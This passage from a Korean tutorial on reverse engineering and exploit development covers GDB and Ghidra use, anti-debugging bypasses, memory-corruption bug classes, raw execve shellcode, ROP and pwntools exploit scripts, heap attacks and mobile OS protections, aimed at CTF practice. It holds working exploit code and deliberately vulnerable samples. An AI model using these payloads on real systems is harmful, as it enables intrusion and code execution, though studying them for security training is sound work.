# 디스어셈블
objdump -d ./binary     # 전체 디스어셈블
objdump -d -M intel ./binary  # Intel 구문으로

# 보안 기능 확인
checksec --file=./binary
# RELRO, Stack Canary, NX, PIE, FORTIFY 상태 확인

# 시스콜 추적
strace ./binary         # 시스콜 호출 추적
ltrace ./binary         # 라이브러리 호출 추적

# 16진수 덤프
xxd ./binary | head -20       # 16진수로 파일 내용 확인
hexdump -C ./binary | head    # 대체 명령어
```

## 12.4 GDB 사용법

```bash
# GDB 시작
gdb ./binary

# GEF 또는 pwndbg 플러그인 설치 추천 (화면이 훨씬 보기 좋아짐)
# GEF: https://github.com/hugsy/gef
# pwndbg: https://github.com/pwndbg/pwndbg
```

```gdb
# 기본 명령어
run                    # 프로그램 실행
run arg1 arg2          # 인자와 함께 실행
break main             # main 함수에 브레이크포인트
break *0x401234        # 특정 주소에 브레이크포인트
info breakpoints       # 브레이크포인트 목록
delete 1               # 1번 브레이크포인트 삭제

# 실행 제어
continue  (c)          # 계속 실행
next      (n)          # 다음 줄 (함수 안으로 안 들어감)
step      (s)          # 다음 줄 (함수 안으로 들어감)
nexti     (ni)         # 다음 명령어 (어셈블리 레벨)
stepi     (si)         # 다음 명령어 (함수 안으로)
finish                 # 현재 함수 끝까지 실행

# 레지스터 확인
info registers         # 모든 레지스터
print $rax             # 특정 레지스터
print/x $rax           # 16진수로

# 메모리 확인
x/10x $rsp             # 스택 포인터에서 10개 워드를 16진수로
x/s 0x401234           # 해당 주소의 문자열
x/20i $rip             # 현재 위치에서 20개 명령어
x/4gx $rsp             # 스택에서 4개 8바이트 값

# x 명령어 형식: x/[개수][형식][크기] [주소]
# 형식: x(16진수), d(10진수), s(문자열), i(명령어), c(문자)
# 크기: b(1바이트), h(2바이트), w(4바이트), g(8바이트)

# 메모리 검색
find 0x400000, 0x500000, "flag"   # 메모리 범위에서 문자열 검색

# 메모리 수정
set $rax = 0x42                    # 레지스터 값 변경
set *(int*)0x601000 = 42           # 메모리 값 변경

# 디스어셈블
disassemble main                   # main 함수 디스어셈블
disassemble $rip                   # 현재 위치 주변

# 프로세스 메모리 매핑
info proc mappings                 # 또는 vmmap (GEF)
```

## 12.5 Ghidra 사용법 (단계별)

```
1. 프로젝트 생성
   File → New Project → Non-Shared Project

2. 바이너리 임포트
   File → Import File → 분석할 파일 선택
   → 자동 분석 "Yes"

3. 주요 창:
   ┌──────────┬──────────┬──────────┐
   │ Symbol   │ Listing  │ Decompile│
   │ Tree     │ (어셈블리)│ (C 코드) │
   │          │          │          │
   │ 함수     │ 기계어 +  │ 디컴파일 │
   │ 목록     │ 어셈블리  │ 결과     │
   └──────────┴──────────┴──────────┘

4. 분석 순서:
   a. 엔트리 포인트 (main) 찾기
      → Symbol Tree에서 main 더블클릭
   b. 디컴파일 창에서 C 유사 코드 읽기
   c. 의심스러운 함수 따라가기
   d. 문자열 검색 (Search → For Strings)
   e. 크로스 레퍼런스 확인 (함수가 어디서 호출되는지)
      → 함수 이름 우클릭 → References → Show References

5. 리네이밍 (가독성 향상):
   - 함수 이름 변경: 함수 우클릭 → Edit Function
   - 변수 이름 변경: 변수 우클릭 → Rename Variable
   - 타입 변경: 변수 우클릭 → Retype Variable
```

---

# 13. 리버스 엔지니어링 실전

## 13.1 일반적인 분석 패턴

```
패턴 1: 비밀번호 확인 로직 찾기

C 디컴파일 결과:
  if (strcmp(input, "s3cr3t_p4ss") == 0) {
      printf("Access Granted!\n");
  }

어셈블리에서 보이는 패턴:
  LEA  RDI, [input]         ; 첫 번째 인자 = 사용자 입력
  LEA  RSI, [0x402010]      ; 두 번째 인자 = 하드코딩된 문자열
  CALL strcmp                ; strcmp 호출
  TEST EAX, EAX             ; 반환값 확인 (0이면 같음)
  JNE  fail                 ; 다르면 실패로 점프

→ 0x402010 주소의 문자열을 확인하면 비밀번호 발견!
```

```
패턴 2: 라이선스 키 검증

디컴파일:
  int check_key(char *key) {
      int sum = 0;
      for (int i = 0; key[i]; i++) {
          sum += key[i];
      }
      return sum == 0x1337;  // 매직 넘버
  }

→ 각 문자의 ASCII 합이 0x1337(4919)이 되는 문자열을 찾으면 됨
→ 이것이 "키젠(keygen)" 만들기의 기초
```

## 13.2 안티-디버깅 탐지 및 우회

```c
// 프로그램이 디버거를 탐지하는 일반적인 방법들:

// 1. ptrace 확인 (Linux)
if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) {
    // 이미 디버거가 붙어 있음!
    exit(1);
}
// 우회: GDB에서 해당 ptrace 호출의 반환값을 0으로 변경

// 2. 시간 측정
clock_t start = clock();
// ... 코드 실행 ...
clock_t end = clock();
if ((end - start) > THRESHOLD) {
    // 디버거로 느리게 실행 중!
    exit(1);
}
// 우회: 시간 관련 함수를 후킹하거나, 비교 조건을 패치

// 3. /proc/self/status 확인 (Linux)
FILE *f = fopen("/proc/self/status", "r");
// TracerPid 필드가 0이 아니면 디버거 존재
// 우회: 해당 파일을 가짜로 제공
```

```
GDB에서 우회하는 방법:

# ptrace 우회
catch syscall ptrace
commands
  set $rax = 0
  continue
end

# 조건 분기 우회 (JNE → JE 또는 NOP)
# 주소 0x401234의 JNE를 NOP로 패치
set *(unsigned short*)0x401234 = 0x9090

# 특정 함수의 반환값 강제 변경
break check_password
commands
  set $rax = 1      # 항상 "맞음" 반환
  continue
end
```

---

# 14. 취약점 유형 완전 분석

## 14.1 Stack Buffer Overflow

가장 고전적이고 기본적인 취약점입니다.

```c
#include <stdio.h>
#include <string.h>

void vulnerable() {
    char buffer[64];
    printf("입력: ");
    gets(buffer);        // 길이 제한 없이 입력받음!
}

void secret() {
    printf("비밀 함수 실행!\n");
    system("/bin/sh");   // 셸 획득
}

int main() {
    vulnerable();
    return 0;
}
```

```
정상 스택 상태:
    ┌─────────────────────┐
    │ main의 스택 프레임    │
    ├─────────────────────┤
    │ 복귀 주소 (main+XX)  │  ← vulnerable()이 끝나면 여기로 돌아감
    ├─────────────────────┤
    │ 저장된 RBP           │
    ├─────────────────────┤
    │ buffer[64]           │  ← gets()가 여기에 씀
    │ [63]...[0]           │
    └─────────────────────┘ ← RSP

오버플로우 시:
    ┌─────────────────────┐
    │ main의 스택 프레임    │
    ├─────────────────────┤
    │ secret()의 주소로    │  ← 복귀 주소가 덮어써짐!
    │ 덮어써짐!            │
    ├─────────────────────┤
    │ AAAAAAAAAA           │  ← RBP도 덮어써짐
    ├─────────────────────┤
    │ AAAAAAAAAAAAAAAA     │  ← buffer를 넘어서 계속 씀
    │ AAAAAAAAAAAAAAAA     │
    └─────────────────────┘

vulnerable()이 RET 실행 → 덮어쓴 주소(secret)로 점프!
→ secret() 함수가 실행됨 → 셸 획득!
```

**exploit 작성:**
```python
# Python으로 exploit 페이로드 생성
import struct

buffer_size = 64
saved_rbp = 8
secret_addr = 0x401234   # secret() 함수 주소

payload = b'A' * buffer_size     # buffer 채우기
payload += b'B' * saved_rbp      # saved RBP 덮기
payload += struct.pack('<Q', secret_addr)  # 복귀 주소 = secret()

# 프로그램에 전달
print(payload)
```

## 14.2 Format String 취약점

```c
#include <stdio.h>

void vulnerable(char *input) {
    printf(input);       // 사용자 입력을 직접 포맷 문자열로!
}

int main() {
    char buf[100];
    fgets(buf, 100, stdin);
    vulnerable(buf);
    return 0;
}
```

```
공격 시나리오:

1. 정보 유출 (스택 읽기):
   입력: "%x.%x.%x.%x.%x"
   출력: "deadbeef.cafebabe.12345678...."
   → printf가 없는 인자를 스택에서 읽어옴!

2. 임의 주소 읽기:
   입력: "%7$s" + [대상 주소]
   → 해당 주소의 문자열을 출력

3. 임의 주소 쓰기 (%n):
   %n은 "지금까지 출력한 바이트 수"를 해당 주소에 씀!
   입력을 조작하면 원하는 주소에 원하는 값을 쓸 수 있음
   
   이것으로 GOT 엔트리를 덮어써서 프로그램 흐름 변경 가능
```

## 14.3 Use-After-Free (UAF)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct User {
    char name[32];
    void (*print)(struct User *);   // 함수 포인터!
};

void normal_print(struct User *u) {
    printf("User: %s\n", u->name);
}

void admin_shell(struct User *u) {
    system("/bin/sh");
}

int main() {
    // 1. User 객체 생성
    struct User *user = malloc(sizeof(struct User));
    strcpy(user->name, "normal_user");
    user->print = normal_print;
    
    // 2. 해제
    free(user);
    // user 포인터는 여전히 이전 주소를 가리킴! (dangling pointer)
    
    // 3. 같은 크기의 다른 데이터 할당
    // malloc이 방금 해제된 메모리를 재사용할 가능성 높음!
    char *evil = malloc(sizeof(struct User));
    memset(evil, 0, sizeof(struct User));
    
    // 함수 포인터 위치에 admin_shell 주소를 넣음
    *(void **)(evil + 32) = admin_shell;
    
    // 4. 해제된 포인터를 통해 호출
    user->print(user);
    // user가 가리키는 메모리는 이제 evil의 데이터!
    // print 위치에 admin_shell 주소가 있으므로 셸 실행!
    
    return 0;
}
```

```
메모리 상태 변화:

1단계 (할당):
  0x1000: [name: "normal_user"     ] [print: normal_print주소]
          ↑ user가 가리킴

2단계 (해제):
  0x1000: [freed chunk metadata    ] (힙 관리 구조)
          ↑ user가 여전히 가리킴 (dangling!)

3단계 (재할당):
  0x1000: [evil data               ] [admin_shell 주소      ]
          ↑ user가 여전히 가리킴!
          ↑ evil도 가리킴!

4단계 (사용):
  user->print(user)  → 0x1000 + 32 위치의 값을 함수로 호출
  → admin_shell 실행!
```

## 14.4 Integer Overflow

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 취약한 함수
void copy_data(char *src, unsigned short len) {
    // len은 unsigned short: 0 ~ 65535
    unsigned short buf_size = len + 1;  // '\0' 추가 공간
    
    // 만약 len = 65535이면?
    // buf_size = 65535 + 1 = 0 (오버플로우!)
    
    char *buf = malloc(buf_size);  // 0바이트 할당! (또는 최소 크기)
    memcpy(buf, src, len);          // 65535바이트를 0바이트 버퍼에 복사!
    // → 힙 오버플로우!
    
    free(buf);
}
```

## 14.5 Type Confusion

```c
// 객체의 타입을 잘못 해석하는 취약점
// WebKit (Safari), V8 (Chrome) 같은 JS 엔진에서 자주 발견됨

struct Animal {
    int type;     // 0 = Dog, 1 = Cat
    int size;
};

struct Dog {
    int type;
    int size;
    void (*bark)(void);    // 함수 포인터!
};

struct Cat {
    int type;
    int size;
    char name[64];         // 문자열 데이터
};

// type confusion:
// Cat 객체를 Dog로 잘못 캐스팅하면
// name[64] 데이터가 bark 함수 포인터로 해석됨!
// name에 원하는 주소를 넣으면 → 임의 코드 실행!
```

## 14.6 Race Condition (경쟁 상태)

```c
// TOCTOU (Time-of-Check to Time-of-Use)
// 확인 시점과 사용 시점 사이의 갭을 악용

// 취약한 코드:
if (access("/tmp/data.txt", R_OK) == 0) {
    // 여기서 파일 접근 가능하다고 확인됨
    
    // ← 이 틈에 공격자가 /tmp/data.txt를 /etc/shadow의 심볼릭 링크로 교체!
    
    FILE *f = fopen("/tmp/data.txt", "r");
    // 실제로는 /etc/shadow를 읽게 됨!
}
```

---

# 15. Exploit 개발 기초

## 15.1 셸코드 (Shellcode)

셸코드 = 셸(/bin/sh)을 실행하는 기계어 코드

```c
// 셸코드가 하는 일을 C로 표현:
#include <unistd.h>
int main() {
    execve("/bin/sh", NULL, NULL);
}
```

```asm
; x86-64 Linux 셸코드 (어셈블리)
; execve("/bin/sh", NULL, NULL) 시스콜

section .text
global _start
_start:
    xor    rsi, rsi          ; rsi = 0 (argv = NULL)
    xor    rdx, rdx          ; rdx = 0 (envp = NULL)
    
    ; "/bin/sh" 문자열을 스택에 넣기
    mov    rdi, 0x68732f6e69622f   ; "/bin/sh\0" (리틀엔디안)
    push   rdi
    mov    rdi, rsp          ; rdi = "/bin/sh" 주소
    
    mov    al, 59            ; syscall 번호 59 = execve
    syscall
```

```
기계어로 변환하면 (이것이 실제 셸코드):
\x48\x31\xf6\x48\x31\xd2\x48\xbf\x2f\x62\x69\x6e
\x2f\x73\x68\x00\x57\x48\x89\xe7\xb0\x3b\x0f\x05

이 바이트열을 메모리에 넣고 실행시키면 셸이 열림!
```

## 15.2 Return-to-libc

NX(Non-Executable) 보호가 있으면 셸코드를 직접 실행할 수 없습니다.
대신 이미 메모리에 있는 함수(libc)를 호출합니다.

```
Return-to-libc 공격 흐름:

1. 취약한 함수의 복귀 주소를 system() 주소로 덮어씀
2. system()의 인자로 "/bin/sh" 문자열 주소를 설정
3. 함수가 복귀할 때 system("/bin/sh") 실행!

스택 구성:
    ┌──────────────────┐
    │ "/bin/sh" 주소    │  ← system()의 인자 (RDI)
    ├──────────────────┤
    │ system() 주소     │  ← 복귀 주소를 덮어씀
    ├──────────────────┤
    │ AAAAAAAAAA        │  ← 버퍼 오버플로우
    └──────────────────┘

x86-64에서는 인자가 레지스터로 전달되므로
RDI에 "/bin/sh" 주소를 넣는 gadget이 필요
→ ROP 기법 사용
```

## 15.3 ROP (Return-Oriented Programming)

```
ROP = 기존 코드 조각(gadget)을 체인으로 연결하여 원하는 동작 수행

Gadget: 유용한 명령어 + RET으로 끝나는 코드 조각

예: "pop rdi; ret" gadget
    → 스택에서 값을 꺼내 RDI에 넣고, 다음 gadget으로 이동

ROP 체인으로 system("/bin/sh") 호출:

스택 (아래가 낮은 주소):
    ┌──────────────────────┐
    │ system() 주소         │  3. system 호출
    ├──────────────────────┤
    │ "/bin/sh" 문자열 주소  │  2. pop rdi로 가져감
    ├──────────────────────┤
    │ pop rdi; ret 주소     │  1. 첫 번째 gadget 실행
    ├──────────────────────┤
    │ AAAAAAA (패딩)        │  0. 버퍼 오버플로우
    └──────────────────────┘

실행 흐름:
  1. vulnerable()의 RET → "pop rdi; ret" 실행
  2. pop rdi → 스택에서 "/bin/sh" 주소를 RDI에 넣음
  3. ret → system() 주소로 점프
  4. system("/bin/sh") 실행!
```

**gadget 찾기:**
```bash
# ROPgadget 도구 사용
ROPgadget --binary ./binary | grep "pop rdi"
# 출력: 0x00401234 : pop rdi ; ret

# ropper 도구
ropper --file ./binary --search "pop rdi"

# one_gadget (libc에서 한 번에 셸을 주는 gadget)
one_gadget /lib/x86_64-linux-gnu/libc.so.6
```

## 15.4 Pwntools (Python exploit 프레임워크)

```python
from pwn import *

# 바이너리 연결
p = process('./vulnerable')           # 로컬 실행
# p = remote('challenge.ctf.com', 1234)  # 원격 서버

# ELF 분석
elf = ELF('./vulnerable')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 주소 찾기
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))

# ROP 체인 자동 구성
rop = ROP(elf)
rop.call('system', [binsh_addr])

# 페이로드 구성
padding = b'A' * 72   # buffer(64) + saved_rbp(8)
payload = padding + rop.chain()

# 전송
p.sendline(payload)

# 셸 획득!
p.interactive()
```

---

# 16. Exploit 개발 심화

## 16.1 ASLR 우회

```
ASLR (Address Space Layout Randomization):
  프로그램 실행할 때마다 메모리 주소가 랜덤으로 바뀜
  
  1회차: libc = 0x7f1234000000
  2회차: libc = 0x7f5678000000
  3회차: libc = 0x7fabcd000000
  → system()의 주소를 미리 알 수 없음!

우회 방법:

1. 정보 유출 (Information Leak)
   - Format String으로 스택에 있는 libc 주소 읽기
   - GOT 엔트리 읽기 (puts@got에 libc의 puts 주소가 있음)
   - 읽은 주소에서 libc 베이스 계산 → system 주소 계산

   예: puts@got에서 읽은 값 = 0x7f1234080970
       libc에서 puts 오프셋   = 0x80970
       libc 베이스 = 0x7f1234080970 - 0x80970 = 0x7f1234000000
       system 오프셋 = 0x4f420
       system 주소 = 0x7f1234000000 + 0x4f420 = 0x7f123404f420

2. Brute Force (32비트만 현실적)
   32비트: ASLR 엔트로피가 작음 (약 8비트 = 256가지)
   → 256번 시도하면 1번은 맞음
   64비트: 엔트로피가 큼 → brute force 비현실적

3. Partial Overwrite
   ASLR은 페이지 단위(4KB = 0x1000)
   → 하위 12비트는 항상 동일
   → 복귀 주소의 하위 1~2바이트만 덮어쓰기
```

## 16.2 GOT Overwrite

```
PLT/GOT 구조:

프로그램이 printf를 처음 호출하면:
  1. printf@plt → printf@got 확인 → 아직 미해석
  2. 동적 링커가 printf의 실제 주소를 찾음
  3. printf@got에 실제 주소를 기록
  4. 다음 호출부터는 @got에서 바로 점프

공격:
  printf@got의 값을 system()의 주소로 덮어쓰면
  → 프로그램이 printf를 호출할 때 실제로는 system() 실행!
  
  printf("ls") → system("ls") 실행!

코드:
```

```python
# GOT Overwrite exploit 예시
from pwn import *

elf = ELF('./binary')
p = process('./binary')

# printf@got를 system 주소로 덮어쓰기
printf_got = elf.got['printf']
system_addr = 0x7f1234000000 + libc.symbols['system']

# write-what-where primitive로 GOT 변경
# (Format String %n 또는 arbitrary write gadget 사용)
```

## 16.3 Heap Exploitation 기초

```
힙 관리자 (glibc malloc):

할당된 청크:
  ┌──────────────┐
  │ prev_size    │  이전 청크 크기 (해제 시 사용)
  ├──────────────┤
  │ size | flags │  현재 청크 크기 + 플래그 (하위 3비트)
  ├──────────────┤
  │              │
  │ 사용자 데이터  │  ← malloc이 반환하는 포인터
  │              │
  └──────────────┘

해제된 청크:
  ┌──────────────┐
  │ prev_size    │
  ├──────────────┤
  │ size | flags │
  ├──────────────┤
  │ fd (forward) │  → 다음 해제 청크를 가리킴
  ├──────────────┤
  │ bk (backward)│  → 이전 해제 청크를 가리킴
  ├──────────────┤
  │ (빈 공간)    │
  └──────────────┘

Free list (해제된 청크들의 연결 리스트):
  bins[0] → chunk_A ↔ chunk_B ↔ chunk_C

fd/bk 포인터를 조작할 수 있으면?
→ unlink 시 임의 주소에 임의 값을 쓸 수 있음!
```

**tcache poisoning (최신 기법):**
```
glibc 2.26+의 tcache (Thread-Local Cache):
  각 스레드마다 작은 크기의 청크를 캐시
  보안 검사가 상대적으로 약함

공격:
  1. chunk A, B 할당
  2. A, B 순서로 해제 → tcache: B → A
  3. A의 fd (next 포인터)를 원하는 주소로 변경 (UAF 이용)
  4. malloc() 두 번 호출
     - 첫 번째: B 반환 (정상)
     - 두 번째: 조작된 주소 반환! (임의 주소에 쓰기 가능)
```

---

# 17. 최신 보호 기법과 우회

## 17.1 보호 기법 총정리

```
┌─────────────────┬─────────────────────────┬──────────────────────┐
│ 보호 기법         │ 하는 일                  │ 우회 방법             │
├─────────────────┼─────────────────────────┼──────────────────────┤
│ Stack Canary    │ 스택에 랜덤 값을 넣어     │ 카나리 값을 먼저      │
│                 │ 오버플로우 감지           │ 유출(leak)한 후 보존  │
├─────────────────┼─────────────────────────┼──────────────────────┤
│ NX / DEP        │ 데이터 영역 실행 불가     │ ROP / Return-to-libc │
├─────────────────┼─────────────────────────┼──────────────────────┤
│ ASLR            │ 메모리 주소 랜덤화        │ 정보 유출로 주소 계산 │
├─────────────────┼─────────────────────────┼──────────────────────┤
│ PIE             │ 바이너리 자체도 랜덤 배치 │ 바이너리 주소도 유출  │
├─────────────────┼─────────────────────────┼──────────────────────┤
│ RELRO           │ GOT를 읽기 전용으로       │ Full: GOT 공격 불가  │
│                 │                         │ Partial: 일부 가능    │
├─────────────────┼─────────────────────────┼──────────────────────┤
│ FORTIFY_SOURCE  │ 위험한 함수에 크기 검사   │ 검사 범위 밖의 취약점 │
├─────────────────┼─────────────────────────┼──────────────────────┤
│ CFI             │ 제어 흐름 무결성 검사     │ 허용된 대상만 호출    │
│                 │ (함수 포인터 검증)        │ (대상 범위 내 공격)   │
├─────────────────┼─────────────────────────┼──────────────────────┤
│ PAC (ARM)       │ 포인터 인증 코드          │ PAC 키 유출 또는      │
│                 │ (포인터에 서명)           │ 서명 생성 gadget 활용 │
├─────────────────┼─────────────────────────┼──────────────────────┤
│ MTE (ARM)       │ 메모리 태깅              │ 태그 추측 (1/16 확률) │
│                 │ (포인터에 태그 부착)      │ 또는 태그 유출        │
└─────────────────┴─────────────────────────┴──────────────────────┘
```

## 17.2 Stack Canary 상세

```
Stack Canary = 스택 프레임에 넣는 랜덤 감시 값

정상 스택:
    ┌────────────────┐
    │ 복귀 주소       │
    ├────────────────┤
    │ 저장된 RBP     │
    ├────────────────┤
    │ CANARY 값      │  ← 랜덤 값 (예: 0x00a1b2c3d4e5f607)
    ├────────────────┤   첫 바이트가 0x00인 이유: 문자열 연산으로
    │ buffer[64]     │   카나리를 읽는 것을 방지
    └────────────────┘

오버플로우 감지:
    함수 종료 전에 카나리 값을 확인
    → 변경되었으면 → __stack_chk_fail() 호출 → 프로그램 종료

우회 방법:
1. 카나리 값 유출 (Format String, 한 바이트씩 brute force 등)
2. 카나리를 건너뛰는 overflow (특수한 경우)
3. 카나리 뒤의 다른 데이터를 타겟 (예: 구조체 멤버)
```

## 17.3 PAC (Pointer Authentication Code) — Apple A12+

```
PAC: ARM v8.3에 추가된 하드웨어 보호

일반 포인터:
  0x0000 7fff 1234 5678
  ^^^^^^^^                 상위 비트 (미사용, 보통 0)
           ^^^^^^^^^^^^^^^  실제 주소

PAC 적용 포인터:
  0x1A3B 7fff 1234 5678
  ^^^^                     PAC (인증 코드, 암호학적 서명)
       ^^^^^^^^^^^^^^^     실제 주소

포인터를 사용하기 전에 PAC을 검증:
  AUTIA X0, X1    ; X0의 포인터를 X1(컨텍스트)로 인증
                  ; PAC이 올바르면 → 원래 포인터 복원
                  ; PAC이 틀리면 → 상위 비트를 오류 값으로 설정
                  ;                → 사용 시 크래시!

공격자가 포인터를 덮어쓰면:
  → PAC 값을 모르므로 올바른 서명을 만들 수 없음
  → 포인터 사용 시 인증 실패 → 크래시
  → ROP 체인의 gadget 주소도 서명 필요!

Apple의 PAC 사용:
  - 함수 복귀 주소 (LR) 서명
  - 가상 함수 테이블 (vtable) 포인터 서명
  - Objective-C ISA 포인터 서명
  → iOS 탈옥이 극도로 어려워진 이유 중 하나
```

## 17.4 KTRR / PPL / AMCC (Apple 커널 보호)

```
Apple의 다층 커널 보호:

KTRR (Kernel Text Readonly Region):
  - 커널 코드 영역을 하드웨어 레벨에서 읽기 전용으로 잠금
  - 소프트웨어로 해제 불가능
  - 커널 코드를 패치할 수 없음!

PPL (Page Protection Layer):
  - 페이지 테이블을 보호하는 별도 실행 레벨
  - 커널 코드 실행 권한으로도 페이지 테이블 수정 불가
  - "커널 안의 커널" 개념

AMCC (Apple Memory Controller Configuration):
  - 메모리 컨트롤러 하드웨어에서 메모리 영역 보호
  - DMA(직접 메모리 접근) 공격도 차단
  - 커널이 탈취되어도 이 보호를 해제할 수 없음

공격 난이도 변화:
  iOS 9 이전:  커널 exploit 1개 → 탈옥 가능
  iOS 10~11:   커널 exploit + KPP/KTRR 우회 필요
  iOS 12~14:   커널 exploit + PAC 우회 + PPL 우회 필요
  iOS 15+:     위의 모든 것 + AMCC 우회 + 추가 보호들...
  
  → 해가 갈수록 기하급수적으로 어려워지고 있음
```

---

# 18. iOS 내부 구조

## 18.1 iOS 아키텍처

```
┌────────────────────────────────────┐
│          사용자 앱                   │  UIKit, SwiftUI
├────────────────────────────────────┤
│       프레임워크 (Cocoa Touch)       │  Foundation, Core Data
├────────────────────────────────────┤
│       Core Services               │  URLSession, CloudKit
├────────────────────────────────────┤
│       Core OS                     │  Mach, BSD, IOKit
├────────────────────────────────────┤
│       XNU 커널                     │  Mach + BSD 하이브리드
├────────────────────────────────────┤
│       Secure Enclave (SEP)        │  별도 프로세서, 별도 OS
├────────────────────────────────────┤
│       Boot ROM                    │  읽기 전용, 최초 부팅 코드
└────────────────────────────────────┘
```

## 18.2 iOS 부팅 체인 (Secure Boot)

```
iPhone 전원 버튼 →

1. Boot ROM (하드웨어에 고정, 변경 불가!)
   → Apple Root CA 공개 키 내장
   → LLB (Low Level Bootloader) 서명 검증
   → 검증 실패 → DFU 모드

2. LLB
   → iBoot 서명 검증
   
3. iBoot
   → 커널 (kernelcache) 서명 검증
   → Device Tree 로드
   
4. XNU 커널
   → 루트 파일시스템 마운트
   → launchd (PID 1) 시작
   → 모든 서비스/앱 시작

각 단계가 다음 단계를 암호학적으로 검증!
한 단계라도 변조되면 부팅 거부

checkm8이 공격하는 곳:
  Boot ROM의 USB DFU 모드 코드에 취약점
  → 검증 과정 자체를 건너뛸 수 있음
  → 하지만 A12+에서는 Boot ROM이 다르므로 불가
```

## 18.3 Secure Enclave (SEP)

```
Secure Enclave:
  - 메인 프로세서(AP)와 물리적으로 분리된 보안 프로세서
  - 자체 OS (SEPOS), 자체 부팅 과정
  - 메인 CPU에서 SEP 메모리 접근 불가!

저장하는 것:
  - 기기 고유 UID 키 (공장에서 설정, 외부에서 읽기 불가)
  - 잠금 비밀번호 + UID로 유도된 암호화 키
  - Touch ID / Face ID 생체 데이터
  - Apple Pay 키
  - Keychain 암호화 키

비밀번호 검증 흐름:
  사용자 입력 → AP가 SEP에 전달 → SEP 내부에서 검증
  → 틀리면 점점 긴 지연 (80ms → 5초 → 1분 → 5분 → 1시간)
  → 이 지연은 SEP 하드웨어에서 강제, 소프트웨어 우회 불가

Cellebrite/GrayKey가 하는 것:
  SEP의 소프트웨어 취약점을 이용하여
  지연 없이 반복 시도할 수 있게 만듦
  → 하지만 UID 키는 여전히 SEP 밖으로 나올 수 없음
  → 브루트포스를 SEP 안에서 해야 함 → 느림
```

## 18.4 iOS 앱 보안

```
iOS 앱 보안 모델:

1. 코드 서명 (Code Signing)
   - 모든 실행 코드는 Apple 또는 개발자의 서명 필요
   - 서명 없는 코드 실행 불가
   - 탈옥의 주요 목표: 이 검사 무력화

2. 샌드박스 (Sandbox)
   - 각 앱은 자기 디렉토리만 접근 가능
   - 다른 앱의 데이터, 시스템 파일 접근 불가
   - 탈옥 앱이 시스템 파일에 접근하려면 샌드박스 탈출 필요

3. 앱 디렉토리 구조:
   /var/mobile/Containers/Data/Application/[UUID]/
   ├── Documents/     ← 사용자 데이터
   ├── Library/
   │   ├── Caches/
   │   └── Preferences/  ← 설정 파일 (.plist)
   └── tmp/

4. Entitlements (권한)
   - 앱이 사용할 수 있는 기능을 명시
   - com.apple.security.network.client  → 네트워크 접근
   - com.apple.private.security.storage → 키체인 접근
   - platform-application → 시스템 앱 권한 (일반 앱은 불가)
```

---

# 19. Android 내부 구조

## 19.1 Android 아키텍처

```
┌────────────────────────────────────┐
│          앱 (APK)                   │  Java/Kotlin → DEX
├────────────────────────────────────┤
│       Android Framework            │  Activity, Service, etc.
├────────────────────────────────────┤
│       ART (Android Runtime)        │  DEX → 네이티브 코드 변환
├────────────────────────────────────┤
│       HAL (Hardware Abstraction)   │  하드웨어 추상화
├────────────────────────────────────┤
│       Linux 커널                    │  프로세스, 메모리, 드라이버
├────────────────────────────────────┤
│       TEE (TrustZone)             │  보안 영역 (키 저장)
├────────────────────────────────────┤
│       부트로더 (U-Boot 등)          │  
└────────────────────────────────────┘
```

## 19.2 Android 보안 모델

```
1. SELinux (Security-Enhanced Linux)
   - 모든 프로세스/파일에 보안 레이블 부여
   - 정책에 명시되지 않은 접근은 거부
   - root 권한이 있어도 SELinux가 차단할 수 있음!
   
   ls -Z /system/bin/sh
   # u:object_r:shell_exec:s0
   
   루팅 시 SELinux를 permissive로 변경하거나
   정책을 수정해야 하는 이유

2. 앱 샌드박스
   - 각 앱은 고유한 Linux UID를 가짐
   - /data/data/com.example.app/ → 해당 앱만 접근 가능

3. Verified Boot
   - 부팅 시 각 파티션의 무결성 검증
   - 변조 감지 시 부팅 거부 또는 경고
   - dm-verity: system 파티션 실시간 무결성 검증

4. KeyStore / StrongBox
   - 하드웨어 보안 모듈에 키 저장
   - iOS의 Secure Enclave와 유사한 역할
```

## 19.3 APK 분석

```
APK 구조 (ZIP 형식):
  app.apk
  ├── AndroidManifest.xml    ← 앱 정보, 권한, 컴포넌트
  ├── classes.dex            ← 실행 코드 (Dalvik bytecode)
  ├── classes2.dex           ← 추가 코드 (멀티덱스)
  ├── resources.arsc         ← 리소스 테이블
  ├── res/                   ← 리소스 파일들
  ├── lib/                   ← 네이티브 라이브러리 (.so)
  │   ├── arm64-v8a/
  │   ├── armeabi-v7a/
  │   └── x86_64/
  ├── assets/                ← 추가 파일
  └── META-INF/              ← 서명 정보

분석 도구:
  - JADX: DEX → Java 디컴파일 (추천!)
  - apktool: APK 디코딩/리빌드
  - frida: 동적 분석/후킹 (실행 중인 앱에 코드 주입)
  - objection: frida 기반 자동화 도구
```

---

# 20. 실전 CTF 풀이 가이드

## 20.1 CTF 카테고리

```
CTF (Capture The Flag) 보안 대회:
  문제를 풀면 "플래그" (예: flag{h3llo_w0rld})를 얻는 형식

카테고리:

1. PWN (Binary Exploitation)
   - 바이너리 프로그램의 취약점을 exploit
   - 이 문서에서 배운 것의 직접적인 응용!
   - 스택 오버플로우, 힙 exploit, ROP 등

2. REV (Reverse Engineering)
   - 바이너리를 분석하여 숨겨진 로직/키를 찾기
   - Ghidra, IDA Pro 사용

3. Web
   - 웹 취약점 (SQL 인젝션, XSS, SSRF 등)
   - 웹 개발 지식 필요

4. Crypto
   - 암호학 문제 (RSA, AES, 해시 등)
   - 수학적 사고 필요

5. Forensics
   - 디스크 이미지, 메모리 덤프, 네트워크 캡처 분석
   - 숨겨진 데이터 찾기

6. Misc
   - 그 외 (프로그래밍, OSINT, 스테가노그래피 등)
```

## 20.2 PWN 문제 풀이 절차

```
1. 바이너리 분석
   $ file ./challenge
   $ checksec --file=./challenge   # 보호 기법 확인
   
2. 디스어셈블/디컴파일
   $ ghidra &     # Ghidra로 코드 분석
   
3. 취약점 찾기
   - 위험한 함수 사용: gets, strcpy, sprintf, scanf("%s")
   - 크기 검사 없는 입력
   - Format String
   
4. exploit 전략 수립
   - 어떤 보호 기법이 있는지에 따라 전략이 달라짐
   - NX 없음 → 셸코드 직접 실행
   - NX 있음, ASLR 없음 → Return-to-libc
   - NX + ASLR 있음 → 정보 유출 + ROP
   - Canary 있음 → 카나리 유출 필요
   
5. exploit 작성 (pwntools)
   
